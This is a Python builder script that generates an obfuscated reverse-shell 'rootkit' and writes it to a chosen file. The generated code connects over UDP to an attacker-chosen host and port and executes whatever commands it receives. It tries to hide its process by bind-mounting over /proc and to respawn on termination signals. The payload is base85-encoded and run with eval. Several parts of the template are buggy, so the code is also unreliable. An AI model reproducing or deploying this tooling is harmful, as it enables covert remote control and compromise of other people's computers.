import signal
import os
import sys
import colorama
import socket
from base64 import b85encode, b85decode


def create(Host: str, Port: int, s: list, PATH: str):
    """Creates Reverse_Shell Rootkit With Parameters"""
    from time import sleep as Sleep
    Red, Blue, Green, Reset = colorama.Fore.LIGHTRED_EX, colorama.Fore.LIGHTBLUE_EX, colorama.Fore.LIGHTGREEN_EX, colorama.Fore.RESET
    print("[", Green + "!" + Reset + "]" + Reset +
          "Opening File To Write Data On It...", end="")
    Sleep(0.2)
    try:
        f = open(PATH, "w+")
    except:
        print(
            "\r[" + Red + "-" + "]" + Reset + "Opening File To Write Data On It...Failed \n Cannnot Open File")
        Sleep(0.2)
        return False
    else:
        print("\r[" + Blue + "+" + Reset + "]" + Reset +
              "Opening File To Write Data On It...Done")
        Sleep(0.2)
    Rootkit_Data = """
'''
{Connected} = False

def {relaunch}():
        cmd = sys.argv
        proc = subprocess.Popen(
            ' '.join(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        {Connection}.send(File Is Closed But I will not die...)


def {hide_process}():
        ch = string.uppercase + string.digits
        # Bind mount - works with root on linux
        token = "".join(random.choice(ch) for i in range(32))
        pid = os.getpid()

        if os.path.isdir("/tmp/{0}".format(token)) is False:
            if os.system("sudo whoami") == 'root':
                os.system(
                    "sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid, token))

        signal.signal(signal.SIGTERM, {relaunch})
        signal.signal(signal.SIGTINT, {relaunch})


{hide_process}()
while not {Connected}:
    try:
        {Connection} = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        port = {p}
        host = "{h}"
        {Connection}.connect((host, port))
        {Connected} = True
    except:
        {Connected} = False
    else:
        {Connection}.send((sys.platform).encode('UTF-8'))
    while {Connected}:
        try:

            {Command} = {Connection}.recv(1024).decode("UTF-8")
            if {Command}.strip().split() == "cd ":
                {Result} = os.chdir({Command}.strip('cd '))
            elif {Command}.strip().split() == "CD ":
                {Result} = os.chdir({Command}.strip('CD '))
            else:
                {Result} = os.popen({Command}).read()

            {Connection}.send({Result}.encode("UTF-8"))
        except:
            {Connected} = False
'''
                               """.format(Connected=s[0], Connection=s[1], Command=s[2], Result=s[3], relaunch=s[4], hide_process=s[5],  h=Host, p=Port)
    from colorama import Fore
    Red, Blue, Green, Reset = Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.RESET
    from time import sleep as Sleep
    print("[" + Blue + "+" + Reset + "]" + Reset +
          "Encrypting Data Before Writing On File...\n", end="")
    Rootkit_Data = b85encode(bytes(Rootkit_Data, 'UTF-8')).decode("UTF-8")
    Rootkit_Data = "value = '''\n" + Rootkit_Data + "\n'''\n"
    print("Done")
    Rootkit_Data += '''
from base64 import b85decode
value = bytes(value, 'UTF-8')
script_data = b85decode(value)
eval(compile(script_data.decode('UTF-8')))
    '''
    print("[" + Green + "!" + Reset + "]" +
          Reset + "Writing Data On File...", end="")
    try:
        f.write(Rootkit_Data)
    except PermissionError:
        print("\r[" + Red + "-" + Reset + "]" + Reset + "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
              "You Dont Have Access To The File.")
    except:
        print("\r[", Red + "-", "]" + Reset + "Writing Data On File...Failed \nSomething Went Wrong . Is Another Process "
              "Using It ? ")
        Sleep(0.2)
        print("[", Red + "-", "]" + Reset +
              "Couldnt Write Data On File Closing File...", end="")
        f.close()
        Sleep(0.2)
        print("Done")
    else:
        print("\r[" + Blue + "+" + Reset + "]" +
              Reset + "Writing Data On File...Done")
        print("[" + Blue + "+" + Reset + "]",
              Fore.RESET + "Succesfully Created A Windows UDP Rootkit")
        Sleep(1)
